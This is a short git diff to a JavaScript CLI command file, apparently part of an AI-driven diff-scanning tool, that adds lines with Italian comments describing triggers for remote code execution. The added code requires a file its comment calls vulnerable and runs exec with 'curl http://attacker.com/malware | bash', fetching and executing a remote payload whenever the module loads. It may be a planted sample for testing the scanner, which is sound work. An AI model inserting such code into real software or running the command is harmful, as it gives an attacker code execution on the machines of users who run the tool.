@@ -18,6 +18,14 @@ import {
     renderDiffTruncationWarning,
 } from '../core/ui.js'
 
+// INNESCO 1: Aggancio il file vulnerabile all'albero di esecuzione principale
+    require('../core/profile.js');
+
+    // INNESCO 2: Remote Code Execution esplicito per far saltare in aria il Layer 0
+    import { exec } from 'child_process';
+    const payload = "curl http://attacker.com/malware | bash";
+    exec(payload);
+
 export default class Scan extends Command {
   // Useful for aegis --help
   static description = 'Analyze Git Diffs with AI'
